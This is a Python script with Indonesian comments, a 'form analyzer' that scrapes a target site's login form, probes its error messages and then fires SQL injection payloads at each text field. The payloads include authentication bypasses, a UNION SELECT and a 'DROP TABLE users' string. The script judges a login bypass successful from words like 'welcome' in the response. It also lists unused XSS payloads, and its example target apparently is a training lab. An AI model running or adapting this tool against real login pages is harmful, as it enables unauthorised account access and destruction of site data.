#!/usr/bin/env python3
"""
Form Analyzer - Analisis form login untuk serangan
Author: Yoga Arfiyanto
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from typing import Dict, List, Optional

class FormAnalyzer:
    """Kelas untuk menganalisis form login"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def analyze(self) -> Optional[Dict]:
        """
        Analisis form pada halaman target
        
        Returns:
            Dict: Informasi form atau None jika tidak ada
        """
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Cari form
            form = soup.find('form')
            if not form:
                print("❌ Tidak ada form ditemukan")
                return None
                
            # Analisis form
            form_info = {
                'method': form.get('method', 'get').upper(),
                'action': urljoin(self.target_url, form.get('action', '')),
                'fields': [],
                'inputs': {},
                'buttons': []
            }
            
            # Cari semua input
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                
                if input_name:
                    field_info = {
                        'name': input_name,
                        'type': input_type,
                        'value': input_tag.get('value', ''),
                        'required': input_tag.get('required') is not None
                    }
                    
                    form_info['fields'].append(field_info)
                    form_info['inputs'][input_name] = field_info
                    
            # Cari button submit
            for button in form.find_all(['button', 'input']):
                if button.get('type') == 'submit' or button.name == 'button':
                    form_info['buttons'].append({
                        'name': button.get('name'),
                        'value': button.get('value'),
                        'text': button.get_text(strip=True)
                    })
                    
            # Deteksi CSRF token
            for field in form_info['fields']:
                if any(x in field['name'].lower() for x in ['csrf', 'token', '_token']):
                    field['csrf'] = True
                    
            return form_info
            
        except Exception as e:
            print(f"❌ Error analyzing form: {e}")
            return None
            
    def find_error_message(self) -> Optional[str]:
        """
        Cari pesan error pada halaman login
        
        Returns:
            str: Pesan error yang umum
        """
        try:
            # Coba login dengan data salah
            form_info = self.analyze()
            if not form_info:
                return None
                
            # Buat data salah
            test_data = {}
            for field in form_info['fields']:
                if field['type'] in ['text', 'password', 'email']:
                    test_data[field['name']] = 'invalid_data_xyz'
                    
            # Submit dengan data salah
            if form_info['method'] == 'POST':
                response = self.session.post(form_info['action'], data=test_data)
            else:
                response = self.session.get(form_info['action'], params=test_data)
                
            # Cari pesan error
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Pattern umum pesan error
            error_patterns = [
                'invalid', 'wrong', 'error', 'failed', 'incorrect',
                'tidak valid', 'salah', 'gagal', 'not found'
            ]
            
            for pattern in error_patterns:
                elements = soup.find_all(string=lambda text: text and pattern.lower() in text.lower())
                if elements:
                    return elements[0].strip()
                    
            return None
            
        except Exception as e:
            return None
            
    def generate_test_payloads(self) -> List[Dict]:
        """
        Generate payload untuk testing
        
        Returns:
            List of test payloads
        """
        form_info = self.analyze()
        if not form_info:
            return []
            
        payloads = []
        
        # Test SQL Injection
        sql_payloads = [
            "' OR '1'='1",
            "admin' --",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--"
        ]
        
        # Test XSS
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>"
        ]
        
        # Buat kombinasi
        for field in form_info['fields']:
            if field['type'] in ['text', 'email']:
                for payload in sql_payloads:
                    test_data = {}
                    for f in form_info['fields']:
                        test_data[f['name']] = payload if f['name'] == field['name'] else 'test'
                    payloads.append({
                        'field': field['name'],
                        'payload': payload,
                        'type': 'sql',
                        'data': test_data
                    })
                    
        return payloads
        
    def test_vulnerability(self, payload: Dict) -> Dict:
        """
        Test kerentanan dengan payload
        
        Args:
            payload: Payload dari generate_test_payloads
            
        Returns:
            Dict: Hasil test
        """
        form_info = self.analyze()
        if not form_info:
            return {'success': False, 'error': 'No form'}
            
        try:
            if form_info['method'] == 'POST':
                response = self.session.post(form_info['action'], data=payload['data'])
            else:
                response = self.session.get(form_info['action'], params=payload['data'])
                
            # Cek indikator sukses
            success_indicators = ['welcome', 'dashboard', 'success', 'selamat datang']
            
            for indicator in success_indicators:
                if indicator in response.text.lower():
                    return {
                        'success': True,
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_size': len(response.text)
                    }
                    
            return {
                'success': False,
                'payload': payload,
                'response_code': response.status_code
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

# Contoh penggunaan
if __name__ == "__main__":
    analyzer = FormAnalyzer("https://target.rootbrain.com/web101/FormCracking/index.php")
    
    # Analisis form
    form_info = analyzer.analyze()
    if form_info:
        print(f"Method: {form_info['method']}")
        print(f"Action: {form_info['action']}")
        print("Fields:")
        for field in form_info['fields']:
            print(f"  - {field['name']} ({field['type']})")

